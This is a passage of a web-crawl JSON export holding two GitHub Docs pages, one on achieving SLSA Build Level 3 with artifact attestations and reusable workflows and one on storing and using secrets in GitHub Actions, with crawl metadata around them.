workflow.\nBuilding with a reusable workflow\nIf you aren't already using reusable workflows to build your software, you'll need to take your build steps and move them into a reusable workflow. For more information on how to write and call a reusable workflow, see Reusing workflows.\nBuilding with artifact attestations\nThe reusable workflow you use to build your software must also generate artifact attestations to establish build provenance. For more information, see Using artifact attestations to establish provenance for builds.\nWhen you use a reusable workflow to generate artifact attestations, both the calling workflow and the reusable workflow need to have the following permissions.\nYAML\npermissions: attestations: write contents: read id-token: write \nIf you are building container images, you will also need to include the packages: write permission.\nStep 2: Verifying artifact attestations built with a reusable workflow\nTo verify the artifact attestations generated with your builds, you can use gh attestation verify from the GitHub CLI.\nThe gh attestation verify command requires either --owner or --repo flags to be used with it. These flags do two things.\nThey tell gh attestation verify where to fetch the attestation from. This will always be your caller workflow.\nThey tell gh attestation verify where the workflow that did the signing came from. This will always be the workflow that uses attest-build-provenance action, which may be a reusable workflow.\nYou can use optional flags with the gh attestation verify command.\nIf your reusable workflow is not in the same repository as the caller workflow, use the --signer-repo flag to specify the repository that contains the reusable workflow.\nIf you would like to require an artifact attestation to be signed with a specific workflow, use the --signer-workflow flag to indicate the workflow file that should be used.\nFor example, if your calling workflow is ORGANIZATION_NAME/REPOSITORY_NAME/.github/workflows/calling.yml and it uses REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME/.github/workflows/reusable.yml you could do:\nBash\ngh attestation verify -o ORGANIZATION_NAME --signer-repo REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \nOr if you want to specify the exact workflow:\nBash\ngh attestation verify -o ORGANIZATION_NAME --signer-workflow REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME/.github/workflows/reusable.yml PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \nConclusion\nYou are now building and signing your artifacts in a reusable workflow, which can provide the isolation required by SLSA v1.0 Build Level 3. You can verify artifacts are built with known, vetted build instructions by requiring your artifact was built with a specific workflow, reusable or not.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-and-reusable-workflows-to-achie-tv514.html",
  "markdown": "# Using artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3\n\nBuilding software with reusable workflows and artifact attestations can streamline your supply chain security and help you achieve SLSA v1.0 Build Level 3.\n\n## [Introduction](#introduction)\n\nArtifact attestations are a great way to create unfalsifiable provenance and integrity guarantees for the software you build.\n\nBut remember that by itself, artifact attestations provides links, like the build instructions an artifact was built with, which meets SLSA v1.0 Build Level 2. To make an informed risk decision, it's up to you to follow those links and evaluate those build instructions.\n\nYou can take this a step further by requiring builds make use of known, vetted build instructions. A great way to do this is to have your build take place in a reusable workflow that many repositories across your organization share. Reusable workflows can provide isolation between the build process and the calling workflow, to meet SLSA v1.0 Build Level 3.\n\nBefore starting this guide, you should be familiar with:\n\n*   Generating artifact attestations. See [Using artifact attestations to establish provenance for builds](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n*   Writing and using reusable workflows. See [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n## [Step 1: Configuring your builds](#step-1-configuring-your-builds)\n\nFirst, we need to build with both artifact attestations and a reusable workflow.\n\n### [Building with a reusable workflow](#building-with-a-reusable-workflow)\n\nIf you aren't already using reusable workflows to build your software, you'll need to take your build steps and move them into a reusable workflow. For more information on how to write and call a reusable workflow, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n### [Building with artifact attestations](#building-with-artifact-attestations)\n\nThe reusable workflow you use to build your software must also generate artifact attestations to establish build provenance. For more information, see [Using artifact attestations to establish provenance for builds](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n\nWhen you use a reusable workflow to generate artifact attestations, both the calling workflow and the reusable workflow need to have the following permissions.\n\nYAML\n\n```\npermissions:\n  attestations: write\n  contents: read\n  id-token: write\n```\n\nIf you are building container images, you will also need to include the `packages: write` permission.\n\n## [Step 2: Verifying artifact attestations built with a reusable workflow](#step-2-verifying-artifact-attestations-built-with-a-reusable-workflow)\n\nTo verify the artifact attestations generated with your builds, you can use [`gh attestation verify`](https://cli.github.com/manual/gh_attestation_verify) from the GitHub CLI.\n\nThe `gh attestation verify` command requires either `--owner` or `--repo` flags to be used with it. These flags do two things.\n\n*   They tell `gh attestation verify` where to fetch the attestation from. This will always be your caller workflow.\n*   They tell `gh attestation verify` where the workflow that did the signing came from. This will always be the workflow that uses [`attest-build-provenance` action](https://github.com/actions/attest-build-provenance), which may be a reusable workflow.\n\nYou can use optional flags with the `gh attestation verify` command.\n\n*   If your reusable workflow is not in the same repository as the caller workflow, use the `--signer-repo` flag to specify the repository that contains the reusable workflow.\n*   If you would like to require an artifact attestation to be signed with a specific workflow, use the `--signer-workflow` flag to indicate the workflow file that should be used.\n\nFor example, if your calling workflow is `ORGANIZATION_NAME/REPOSITORY_NAME/.github/workflows/calling.yml` and it uses `REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME/.github/workflows/reusable.yml` you could do:\n\nBash\n\n```\ngh attestation verify -o ORGANIZATION_NAME --signer-repo REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME PATH/TO/YOUR/BUILD/ARTIFACT-BINARY\n```\n\nOr if you want to specify the exact workflow:\n\nBash\n\n```\ngh attestation verify -o ORGANIZATION_NAME --signer-workflow REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME/.github/workflows/reusable.yml PATH/TO/YOUR/BUILD/ARTIFACT-BINARY\n```\n\n## [Conclusion](#conclusion)\n\nYou are now building and signing your artifacts in a reusable workflow, which can provide the isolation required by SLSA v1.0 Build Level 3. You can verify artifacts are built with known, vetted build instructions by requiring your artifact was built with a specific workflow, reusable or not.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 238,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-and-reusable-workflows-to-achie",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-and-reusable-workflows-to-achie",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-and-reusable-workflows-to-achie",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-and-reusable-workflows-to-achie",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-using-artifact-attestations-and-reusable-workflows-to-achie"
    },
    "lengths": {
      "extractus": 7015,
      "readableText": 6183,
      "none": 25895,
      "readableTextIfPossible": 25895,
      "result": 6183,
      "markdown": 4955
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions",
    "loadedTime": "2025-05-08T06:37:39.013Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions",
    "title": "Using secrets in GitHub Actions - GitHub Docs",
    "description": "Secrets allow you to store sensitive information in your organization, repository, or repository environments.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using secrets in GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "5A16:214525:4B3526:624420:681BF501",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "23594",
      "date": "Thu, 08 May 2025 06:37:31 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686251.220242, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "36037",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using secrets in GitHub Actions\nSecrets allow you to store sensitive information in your organization, repository, or repository environments.\nFor general information about secrets, see About secrets.\nCreating secrets for a repository\nTo create secrets or variables on GitHub for a personal account repository, you must be the repository owner. To create secrets or variables on GitHub for an organization repository, you must have admin access. Lastly, to create secrets or variables for a personal account repository or an organization repository through the REST API, you must have collaborator access.\nCreating secrets for an environment\nTo create secrets or variables for an environment in a personal account repository, you must be the repository owner. To create secrets or variables for an environment in an organization repository, you must have admin access. For more information on environments, see Managing environments for deployment.\nCreating secrets for an organization\nNote\nOrganization-level secrets and variables are not accessible by private repositories for GitHub Free. For more information about upgrading your GitHub subscription, see Upgrading your account's plan.\nWhen creating a secret or variable in an organization, you can use a policy to limit access by repository. For example, you can grant access to all repositories, or limit access to only private repositories or a specified list of repositories.\nOrganization owners can create secrets or variables at the organization level.\nReviewing access to organization-level secrets\nYou can check which access policies are being applied to a secret in your organization.\nOn GitHub, navigate to the main page of the organization.\nUnder your organization name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the \"Security\" section of the sidebar, select Secrets and variables, then click Actions.\nThe list of secrets includes any configured permissions and policies. For more details about the configured permissions for each secret, click Update.\nUsing secrets in a workflow\nNote\nWith the exception of GITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository.\nSecrets are not automatically passed to reusable workflows. For more information, see Reusing workflows. If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see About security hardening with OpenID Connect.\nTo provide an action with a secret as an input or environment variable, you can use the secrets context to access secrets you've created in your repository. For more information, see Accessing contextual information about workflow runs and Workflow syntax for GitHub Actions.\nsteps: - name: Hello world action with: # Set the secret as an input super_secret: ${{ secrets.SuperSecret }} env: # Or as an environment variable super_secret: ${{ secrets.SuperSecret }} \nSecrets cannot be directly referenced in if: conditionals. Instead, consider setting secrets as job-level environment variables, then referencing the environment variables to conditionally run steps in the job. For more information, see Accessing contextual information about workflow runs and jobs.<job_id>.steps[*].if.\nIf a secret has not been set, the return value of an expression referencing the secret (such as ${{ secrets.SuperSecret }} in the example) will be an empty string.\nAvoid passing secrets between processes from the command line, whenever possible. Command-line processes may be visible to other users (using the ps command) or captured by security audit events. To help protect secrets, consider using environment variables, STDIN, or other mechanisms supported by the target process.\nIf you must pass secrets within a command line, then enclose them within the proper quoting rules. Secrets often contain special characters that may unintentionally affect your shell. To escape these special characters, use quoting with your environment variables. For example:\nExample using Bash\nsteps: - shell: bash env: SUPER_SECRET: ${{ secrets.SuperSecret }} run: | example-command \"$SUPER_SECRET\" \nExample using PowerShell\nsteps: - shell: pwsh env: SUPER_SECRET: ${{ secrets.SuperSecret }} run: | example-command \"$env:SUPER_SECRET\" \nExample using Cmd.exe\nsteps: - shell: cmd env: SUPER_SECRET: ${{ secrets.SuperSecret }} run: | example-command \"%SUPER_SECRET%\" \nLimits for secrets\nYou can store up to 1,000 organization secrets, 100 repository secrets, and 100 environment secrets.\nA workflow created in a repository can access the following number of secrets:\nAll 100 repository secrets.\nIf the repository is assigned access to more than 100 organization secrets, the workflow can only use the first 100 organization secrets (sorted alphabetically by secret name).\nAll 100 environment secrets.\nSecrets are limited to 48 KB in size. To store larger secrets, see the Storing large secrets workaround below.\nStoring large secrets\nTo use secrets that are larger than 48 KB, you can use a workaround to store secrets in your repository and save the decryption passphrase as a secret on GitHub. For example, you can use gpg to encrypt a file containing your secret locally before checking the encrypted file in to your repository on GitHub. For more information, see the gpg manpage.\nWarning\nBe careful that your secrets do not get printed when your workflow runs. When using this workaround, GitHub does not redact secrets that are printed in logs.\nRun the following command from your terminal to encrypt the file containing your secret using gpg and the AES256 cipher algorithm. In this example, my_secret.json is the file containing the secret.\ngpg --symmetric --cipher-algo AES256 my_secret.json \nYou will be prompted to enter a passphrase. Remember the passphrase, because you'll need to create a new secret on GitHub that uses the passphrase as the value.\nCreate a new secret that contains the passphrase. For example, create a new secret with the name LARGE_SECRET_PASSPHRASE and set the value of the secret to the passphrase you used in the step above.\nCopy your encrypted file to a path in your repository and commit it. In this example, the encrypted file is my_secret.json.gpg.\nWarning\nMake sure to copy the encrypted my_secret.json.gpg file ending with the .gpg file extension, and not the unencrypted my_secret.json file.\ngit add my_secret.json.gpg git commit -m \"Add new secret JSON file\" \nCreate a shell script in your repository to decrypt the secret file. In this example, the script is named decrypt_secret.sh.\nShell\n#!/bin/sh # Decrypt the file mkdir $HOME/secrets # --batch to prevent interactive command # --yes to assume \"yes\" for questions gpg --quiet --batch --yes --decrypt --passphrase=\"$LARGE_SECRET_PASSPHRASE\" \\ --output $HOME/secrets/my_secret.json my_secret.json.gpg \nEnsure your shell script is executable before checking it in to your repository.\nchmod +x decrypt_secret.sh git add decrypt_secret.sh git commit -m \"Add new decryption script\" git push \nIn your GitHub Actions workflow, use a step to call the shell script and decrypt the secret. To have a copy of your repository in the environment that your workflow runs in, you'll need to use the actions/checkout action. Reference your shell script using the run command relative to the root of your repository.\nname: Workflows with large secrets on: push jobs: my-job: name: My Job runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Decrypt large secret run: ./decrypt_secret.sh env: LARGE_SECRET_PASSPHRASE: ${{ secrets.LARGE_SECRET_PASSPHRASE }} # This command is just an example to show your secret being printed # Ensure you remove any print statements of your secrets. GitHub does # not hide secrets that use this workaround. - name: Test printing your secret (Remove this step in production) run: cat $HOME/secrets/my_secret.json \nStoring Base64 binary blobs as secrets\nYou can use Base64 encoding to store small binary blobs as secrets. You can then reference the secret in your workflow and decode it for use on the runner. For the size limits, see Using secrets in GitHub Actions.\nNote\nNote that Base64 only converts binary to text, and is not a substitute for actual encryption.\nUse base64 to encode your file into a Base64 string. For example:\nOn macOS, you could run:\nbase64 -i cert.der -o cert.base64 \nOn Linux, you could run:\nbase64 -w 0 cert.der > cert.base64 \nCreate a secret that contains the Base64 string. For example:\n$ gh secret set CERTIFICATE_BASE64 < cert.base64 ✓ Set secret CERTIFICATE_BASE64 for octocat/octorepo \nTo access the Base64 string from your runner, pipe the secret to base64 --decode. For example:\nname: Retrieve Base64 secret on: push: branches: [ octo-branch ] jobs: decode-secret: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Retrieve the secret and decode it to a file env: CERTIFICATE_BASE64: ${{ secrets.CERTIFICATE_BASE64 }} run: | echo $CERTIFICATE_BASE64 | base64 --decode > cert.der - name: Show certificate information run: | openssl x509 -in cert.der -inform DER -text -noout \nNote\nUsing another shell might require different commands for decoding the secret to a file. On Windows runners, we recommend using a bash shell with shell: bash to use the commands in the run step above.\nRedacting secrets from workflow run logs\nGitHub Actions automatically redacts the contents of all GitHub secrets that are printed to workflow logs.\nGitHub Actions also redacts information that is recognized as sensitive, but is not stored as a secret. Currently GitHub supports the following:\n32-byte and 64-byte Azure keys\nAzure AD client app passwords\nAzure Cache keys\nAzure Container Registry keys\nAzure Function host keys\nAzure Search keys\nDatabase connection strings\nHTTP Bearer token headers\nJWTs\nNPM author tokens\nNuGet API keys\nv1 GitHub installation tokens\nv2 GitHub installation tokens (ghp, gho, ghu, ghs, ghr)\nv2 GitHub PATs\nNote\nIf you would like other types of sensitive information to be automatically redacted, please reach out to us in our community discussions.\nAs a habit of best practice, you should mask all sensitive information that is not a GitHub secret by using ::add-mask::VALUE. This causes the value to be treated as a secret and redacted from logs. For more information about masking data, see Workflow commands for GitHub Actions.\nRedacting of secrets is performed by your workflow runners. This means a secret will only be redacted if it was used within a job and is accessible by the runner. If an unredacted secret is sent to a workflow run log, you should delete the log and rotate the secret. For information on deleting logs, see Using workflow run logs.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-secrets-in-github-actions-uke7.html",
  "markdown": "# Using secrets in GitHub Actions\n\nSecrets allow you to store sensitive information in your organization, repository, or repository environments.\n\nFor general information about secrets, see [About secrets](https://docs.github.com/en/actions/security-for-github-actions/security-guides/about-secrets).\n\n## [Creating secrets for a repository](#creating-secrets-for-a-repository)\n\nTo create secrets or variables on GitHub for a personal account repository, you must be the repository owner. To create secrets or variables on GitHub for an organization repository, you must have `admin` access. Lastly, to create secrets or variables for a personal account repository or an organization repository through the REST API, you must have collaborator access.\n\n## [Creating secrets for an environment](#creating-secrets-for-an-environment)\n\nTo create secrets or variables for an environment in a personal account repository, you must be the repository owner. To create secrets or variables for an environment in an organization repository, you must have `admin` access. For more information on environments, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment).\n\n## [Creating secrets for an organization](#creating-secrets-for-an-organization)\n\nNote\n\nOrganization-level secrets and variables are not accessible by private repositories for GitHub Free. For more information about upgrading your GitHub subscription, see [Upgrading your account's plan](https://docs.github.com/en/billing/managing-billing-for-your-github-account/upgrading-your-github-subscription).\n\nWhen creating a secret or variable in an organization, you can use a policy to limit access by repository. For example, you can grant access to all repositories, or limit access to only private repositories or a specified list of repositories.\n\nOrganization owners can create secrets or variables at the organization level.\n\n## [Reviewing access to organization-level secrets](#reviewing-access-to-organization-level-secrets)\n\nYou can check which access policies are being applied to a secret in your organization.\n\n1.  On GitHub, navigate to the main page of the organization.\n    \n2.  Under your organization name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of the tabs in an organization's profile. The \"Settings\" tab is outlined in dark orange.](https://docs.github.com/assets/cb-49309/images/help/discussions/org-settings-global-nav-update.png)\n    \n3.  In the \"Security\" section of the sidebar, select **Secrets and variables**, then click **Actions**.\n    \n4.  The list of secrets includes any configured permissions and policies. For more details about the configured permissions for each secret, click **Update**.\n    \n\n## [Using secrets in a workflow](#using-secrets-in-a-workflow)\n\nNote\n\n*   With the exception of `GITHUB_TOKEN`, secrets are not passed to the runner when a workflow is triggered from a forked repository.\n*   Secrets are not automatically passed to reusable workflows. For more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows#passing-inputs-and-secrets-to-a-reusable-workflow). If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n\nTo provide an action with a secret as an input or environment variable, you can use the `secrets` context to access secrets you've created in your repository. For more information, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts) and [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions).\n\n```\nsteps:\n  - name: Hello world action\n    with: # Set the secret as an input\n      super_secret: ${{ secrets.SuperSecret }}\n    env: # Or as an environment variable\n      super_secret: ${{ secrets.SuperSecret }}\n```\n\nSecrets cannot be directly referenced in `if:` conditionals. Instead, consider setting secrets as job-level environment variables, then referencing the environment variables to conditionally run steps in the job. For more information, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability) and [`jobs.<job_id>.steps[*].if`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsif).\n\nIf a secret has not been set, the return value of an expression referencing the secret (such as `${{ secrets.SuperSecret }}` in the example) will be an empty string.\n\nAvoid passing secrets between processes from the command line, whenever possible. Command-line processes may be visible to other users (using the `ps` command) or captured by [security audit events](https://docs.microsoft.com/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing). To help protect secrets, consider using environment variables, `STDIN`, or other mechanisms supported by the target process.\n\nIf you must pass secrets within a command line, then enclose them within the proper quoting rules. Secrets often contain special characters that may unintentionally affect your shell. To escape these special characters, use quoting with your environment variables. For example:\n\n### [Example using Bash](#example-using-bash)\n\n```\nsteps:\n  - shell: bash\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"$SUPER_SECRET\"\n```\n\n### [Example using PowerShell](#example-using-powershell)\n\n```\nsteps:\n  - shell: pwsh\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"$env:SUPER_SECRET\"\n```\n\n### [Example using Cmd.exe](#example-using-cmdexe)\n\n```\nsteps:\n  - shell: cmd\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"%SUPER_SECRET%\"\n```\n\n## [Limits for secrets](#limits-for-secrets)\n\nYou can store up to 1,000 organization secrets, 100 repository secrets, and 100 environment secrets.\n\nA workflow created in a repository can access the following number of secrets:\n\n*   All 100 repository secrets.\n*   If the repository is assigned access to more than 100 organization secrets, the workflow can only use the first 100 organization secrets (sorted alphabetically by secret name).\n*   All 100 environment secrets.\n\nSecrets are limited to 48 KB in size. To store larger secrets, see the [Storing large secrets](#storing-large-secrets) workaround below.\n\n### [Storing large secrets](#storing-large-secrets)\n\nTo use secrets that are larger than 48 KB, you can use a workaround to store secrets in your repository and save the decryption passphrase as a secret on GitHub. For example, you can use `gpg` to encrypt a file containing your secret locally before checking the encrypted file in to your repository on GitHub. For more information, see the [gpg manpage](https://www.gnupg.org/gph/de/manual/r1023.html).\n\nWarning\n\nBe careful that your secrets do not get printed when your workflow runs. When using this workaround, GitHub does not redact secrets that are printed in logs.\n\n1.  Run the following command from your terminal to encrypt the file containing your secret using `gpg` and the AES256 cipher algorithm. In this example, `my_secret.json` is the file containing the secret.\n    \n    ```\n    gpg --symmetric --cipher-algo AES256 my_secret.json\n    ```\n    \n2.  You will be prompted to enter a passphrase. Remember the passphrase, because you'll need to create a new secret on GitHub that uses the passphrase as the value.\n    \n3.  Create a new secret that contains the passphrase. For example, create a new secret with the name `LARGE_SECRET_PASSPHRASE` and set the value of the secret to the passphrase you used in the step above.\n    \n4.  Copy your encrypted file to a path in your repository and commit it. In this example, the encrypted file is `my_secret.json.gpg`.\n    \n    Warning\n    \n    Make sure to copy the encrypted `my_secret.json.gpg` file ending with the `.gpg` file extension, and **not** the unencrypted `my_secret.json` file.\n    \n    ```\n    git add my_secret.json.gpg\n    git commit -m \"Add new secret JSON file\"\n    ```\n    \n5.  Create a shell script in your repository to decrypt the secret file. In this example, the script is named `decrypt_secret.sh`.\n    \n    Shell\n    \n    ```\n    #!/bin/sh\n    \n    # Decrypt the file\n    mkdir $HOME/secrets\n    # --batch to prevent interactive command\n    # --yes to assume \"yes\" for questions\n    gpg --quiet --batch --yes --decrypt --passphrase=\"$LARGE_SECRET_PASSPHRASE\" \\\n    --output $HOME/secrets/my_secret.json my_secret.json.gpg\n    ```\n    \n6.  Ensure your shell script is executable before checking it in to your repository.\n    \n    ```\n    chmod +x decrypt_secret.sh\n    git add decrypt_secret.sh\n    git commit -m \"Add new decryption script\"\n    git push\n    ```\n    \n7.  In your GitHub Actions workflow, use a `step` to call the shell script and decrypt the secret. To have a copy of your repository in the environment that your workflow runs in, you'll need to use the [`actions/checkout`](https://github.com/actions/checkout) action. Reference your shell script using the `run` command relative to the root of your repository.\n    \n    ```\n    name: Workflows with large secrets\n    \n    on: push\n    \n    jobs:\n      my-job:\n        name: My Job\n        runs-on: ubuntu-latest\n        steps:\n          - uses: actions/checkout@v4\n          - name: Decrypt large secret\n            run: ./decrypt_secret.sh\n            env:\n              LARGE_SECRET_PASSPHRASE: ${{ secrets.LARGE_SECRET_PASSPHRASE }}\n          # This command is just an example to show your secret being printed\n          # Ensure you remove any print statements of your secrets. GitHub does\n          # not hide secrets that use this workaround.\n          - name: Test printing your secret (Remove this step in production)\n            run: cat $HOME/secrets/my_secret.json\n    ```\n    \n\n## [Storing Base64 binary blobs as secrets](#storing-base64-binary-blobs-as-secrets)\n\nYou can use Base64 encoding to store small binary blobs as secrets. You can then reference the secret in your workflow and decode it for use on the runner. For the size limits, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions#limits-for-secrets).\n\nNote\n\nNote that Base64 only converts binary to text, and is not a substitute for actual encryption.\n\n1.  Use `base64` to encode your file into a Base64 string. For example:\n    \n    On macOS, you could run:\n    \n    ```\n    base64 -i cert.der -o cert.base64\n    ```\n    \n    On Linux, you could run:\n    \n    ```\n    base64 -w 0 cert.der > cert.base64\n    ```\n    \n2.  Create a secret that contains the Base64 string. For example:\n    \n    ```\n    $ gh secret set CERTIFICATE_BASE64 < cert.base64\n    ✓ Set secret CERTIFICATE_BASE64 for octocat/octorepo\n    ```\n    \n3.  To access the Base64 string from your runner, pipe the secret to `base64 --decode`. For example:\n    \n    ```\n    name: Retrieve Base64 secret\n    on:\n      push:\n        branches: [ octo-branch ]\n    jobs:\n      decode-secret:\n        runs-on: ubuntu-latest\n        steps:\n          - uses: actions/checkout@v4\n          - name: Retrieve the secret and decode it to a file\n            env:\n              CERTIFICATE_BASE64: ${{ secrets.CERTIFICATE_BASE64 }}\n            run: |\n              echo $CERTIFICATE_BASE64 | base64 --decode > cert.der\n          - name: Show certificate information\n            run: |\n              openssl x509 -in cert.der -inform DER -text -noout\n    ```\n    \n\nNote\n\nUsing another shell might require different commands for decoding the secret to a file. On Windows runners, we recommend [using a bash shell](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsshell) with `shell: bash` to use the commands in the `run` step above.\n\n## [Redacting secrets from workflow run logs](#redacting-secrets-from-workflow-run-logs)\n\nGitHub Actions automatically redacts the contents of all GitHub secrets that are printed to workflow logs.\n\nGitHub Actions also redacts information that is recognized as sensitive, but is not stored as a secret. Currently GitHub supports the following:\n\n*   32-byte and 64-byte Azure keys\n*   Azure AD client app passwords\n*   Azure Cache keys\n*   Azure Container Registry keys\n*   Azure Function host keys\n*   Azure Search keys\n*   Database connection strings\n*   HTTP Bearer token headers\n*   JWTs\n*   NPM author tokens\n*   NuGet API keys\n*   v1 GitHub installation tokens\n*   v2 GitHub installation tokens (`ghp`, `gho`, `ghu`, `ghs`, `ghr`)\n*   v2 GitHub PATs\n\nNote\n\nIf you would like other types of sensitive information to be automatically redacted, please reach out to us in our [community discussions](https://github.com/orgs/community/discussions?discussions_q=is%3Aopen+label%3AActions).\n\nAs a habit of best practice, you should mask all sensitive information that is not a GitHub secret by using `::add-mask::VALUE`. This causes the value to be treated as a secret and redacted from logs. For more information about masking data, see [Workflow commands for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-a-log).\n\nRedacting of secrets is performed by your workflow runners. This means a secret will only be redacted if it was used within a job and is accessible by the runner. If an unredacted secret is sent to a workflow run log, you should delete the log and rotate the secret. For information on deleting logs, see [Using workflow run logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-workflow-run-logs#deleting-logs).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 268,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-secrets-in-github-actions-originalHtmlUrl",
